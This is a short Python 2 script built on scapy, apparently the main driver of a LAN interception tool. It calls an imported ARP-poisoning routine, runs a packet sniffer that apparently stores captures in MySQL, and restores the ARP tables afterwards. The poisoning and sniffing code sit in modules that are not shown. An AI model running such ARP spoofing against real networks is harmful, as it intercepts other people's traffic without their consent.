# coding = utf-8
from scapy.all import *
from scapy.error import Scapy_Exception
import sys
from scapy.layers.inet import *
from arp_poison import arp_poison
from mysniff import My_Sniff


def main():
    arpp = arp_poison()
    snif = My_Sniff()
    try:
        arpp.poison()
        snif.run()
    finally:
        snif.mysql.conn.close()
        print 'do recovery'
        arpp.recovery()


if __name__ == '__main__':
    main()

    pass
